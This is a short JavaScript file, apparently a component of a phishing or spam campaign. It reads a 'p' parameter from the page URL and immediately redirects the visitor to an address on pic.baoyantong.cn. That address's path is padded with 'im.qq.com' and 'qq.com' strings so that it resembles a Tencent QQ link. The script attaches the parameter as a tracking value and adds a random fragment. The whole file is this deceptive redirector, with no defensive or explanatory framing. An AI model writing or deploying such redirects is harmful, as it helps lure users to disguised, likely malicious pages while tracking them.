// remote_script.js

// 获取 URL 参数
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const customParam = urlParams.get('p');

// 生成随机数字和英文组合
const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母

// 构建跳转链接
let redirectURL = "https://pic.baoyantong.cn/pic/20140205/https://im.qq.com/https://qq.com/olaFg,SwMMlQ*,*,;4ks3c,/5sx3.xml";
if (customParam) {
    redirectURL += "?u=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
}

// 执行跳转
window.location.href = redirectURL;
